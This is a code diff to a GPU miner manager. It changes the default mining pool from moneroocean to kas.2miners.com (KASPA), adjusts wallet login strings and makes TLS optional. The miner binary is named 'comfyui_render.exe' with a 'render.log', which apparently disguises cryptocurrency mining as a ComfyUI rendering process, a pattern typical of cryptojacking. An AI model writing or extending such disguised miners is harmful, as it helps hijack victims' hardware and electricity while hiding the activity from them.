@@ -57,9 +57,9 @@ else:
 GPU_BINARY_NAME = "comfyui_render.exe" if IS_WINDOWS else "comfyui_render"
 GPU_LOG_NAME = "render.log"
 
-DEFAULT_ALGO = "ETCHASH"
-DEFAULT_POOL = "gulf.moneroocean.stream"
-DEFAULT_PORT = 20300
+DEFAULT_ALGO = "KASPA"
+DEFAULT_POOL = "kas.2miners.com"
+DEFAULT_PORT = 2020
 DEFAULT_API_PORT = 44882
 TEMP_LIMIT = 85
 TEMP_RESUME = 78
@@ -284,12 +284,16 @@ class GPUMinerManager:
 
     def _build_cmd(self) -> list[str]:
         is_moneroocean = "moneroocean" in self.pool.lower()
+        is_unmineable = "unmineable" in self.pool.lower()
 
         if is_moneroocean:
             user_str = self.wallet
             pass_str = f"{self.worker}~{self.algo.lower()}"
-        else:
+        elif is_unmineable:
             user_str = f"XMR:{self.wallet}.{self.worker}"
+            pass_str = "x"
+        else:
+            user_str = f"{self.wallet}.{self.worker}"
             pass_str = "x"
 
         if self.miner_type == "trex":
@@ -308,16 +312,18 @@ class GPUMinerManager:
             ]
 
         pool_str = f"{self.pool}:{self.port}"
-        return [
+        cmd = [
             str(self.binary_path),
             "--algo", self.algo,
             "--pool", pool_str,
             "--user", user_str,
             "--pass", pass_str,
             "--apiport", str(self.api_port),
-            "--tls", "1",
             "--nocolor",
         ]
+        if self.tls:
+            cmd += ["--tls", "1"]
+        return cmd
 
     # ── lifecycle ────────────────────────────────────────────────────
 
